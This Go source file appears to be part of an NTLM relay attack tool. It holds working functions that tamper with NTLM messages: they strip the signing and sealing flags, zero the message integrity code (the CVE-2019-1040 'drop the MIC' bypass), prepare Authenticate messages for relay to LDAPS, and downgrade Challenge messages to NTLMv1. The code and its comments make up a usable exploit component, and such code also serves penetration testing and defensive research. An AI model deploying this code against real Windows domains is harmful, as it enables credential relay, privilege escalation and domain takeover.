package relay

import "encoding/binary"

// NTLM flag constants used for manipulation.
const (
	ntlmsspNegotiateUnicode    = 1 << 0
	ntlmsspNegotiateSign       = 1 << 4
	ntlmsspNegotiateSeal       = 1 << 5
	ntlmsspNegotiateAlwaysSign = 1 << 15
	ntlmsspNegotiateVersion    = 1 << 25
	ntlmsspNegotiateKeyExch    = 1 << 30
)

// removeSigningFlags strips NTLMSSP_NEGOTIATE_SIGN and NTLMSSP_NEGOTIATE_ALWAYS_SIGN
// from an NTLM Type1 (Negotiate) message. Used for cross-protocol relay (CVE-2019-1040).
func removeSigningFlags(ntlmMsg []byte) []byte {
	if len(ntlmMsg) < 16 {
		return ntlmMsg
	}
	// Make a copy to avoid modifying the original
	msg := make([]byte, len(ntlmMsg))
	copy(msg, ntlmMsg)

	// Flags are at offset 12 (4 bytes, little-endian)
	flags := binary.LittleEndian.Uint32(msg[12:16])
	flags &^= ntlmsspNegotiateSign
	flags &^= ntlmsspNegotiateAlwaysSign
	binary.LittleEndian.PutUint32(msg[12:16], flags)
	return msg
}

// removeMIC strips the MIC and signing-related flags from an NTLM Type3 (Authenticate)
// message. Used for cross-protocol relay (CVE-2019-1040).
func removeMIC(ntlmMsg []byte) []byte {
	if len(ntlmMsg) < 72 {
		return ntlmMsg
	}
	// Make a copy to avoid modifying the original
	msg := make([]byte, len(ntlmMsg))
	copy(msg, ntlmMsg)

	// NegotiateFlags in Type3 are at offset 60 (4 bytes, little-endian)
	flags := binary.LittleEndian.Uint32(msg[60:64])
	flags &^= ntlmsspNegotiateSign
	flags &^= ntlmsspNegotiateAlwaysSign
	flags &^= ntlmsspNegotiateKeyExch
	flags &^= ntlmsspNegotiateVersion
	binary.LittleEndian.PutUint32(msg[60:64], flags)

	// Zero MIC field (16 bytes at offset 72) if message is long enough
	if len(msg) >= 88 {
		copy(msg[72:88], make([]byte, 16))
	}

	return msg
}

// stripType3SigningForLDAPS strips NEGOTIATE_SIGN, NEGOTIATE_SEAL, and NEGOTIATE_ALWAYS_SIGN
// from a Type3 message's NegotiateFlags field and zeros the MIC field.
// This is required for LDAPS relay because the DC returns error 48
// ("Cannot start kerberos signing/sealing when using TLS/SSL") if signing flags are present.
// Note: Zeroing MIC may fail on fully patched DCs that enforce MIC validation.
// MsvAvFlags (MIC_PROVIDED) cannot be cleared because it's inside the NtChallengeResponse
// AV_PAIRS which are integrity-protected by NtProofStr.
func stripType3SigningForLDAPS(ntlmMsg []byte) []byte {
	if len(ntlmMsg) < 64 {
		return ntlmMsg
	}
	msg := make([]byte, len(ntlmMsg))
	copy(msg, ntlmMsg)

	// Strip SIGN, SEAL, ALWAYS_SIGN from NegotiateFlags at offset 60
	flags := binary.LittleEndian.Uint32(msg[60:64])
	flags &^= ntlmsspNegotiateSign
	flags &^= ntlmsspNegotiateSeal
	flags &^= ntlmsspNegotiateAlwaysSign
	binary.LittleEndian.PutUint32(msg[60:64], flags)

	// Zero MIC field (16 bytes at offset 72) — modifying flags invalidates MIC
	if len(msg) >= 88 {
		copy(msg[72:88], make([]byte, 16))
	}

	return msg
}

// downgradeToNTLMv1 modifies a Type2 (Challenge) message flags to request NTLMv1
// by removing the NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY flag.
func downgradeToNTLMv1(ntlmType2 []byte) []byte {
	if len(ntlmType2) < 24 {
		return ntlmType2
	}
	msg := make([]byte, len(ntlmType2))
	copy(msg, ntlmType2)

	// Flags in Type2 are at offset 20 (4 bytes, little-endian)
	flags := binary.LittleEndian.Uint32(msg[20:24])
	flags &^= 1 << 19 // NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY
	binary.LittleEndian.PutUint32(msg[20:24], flags)
	return msg
}
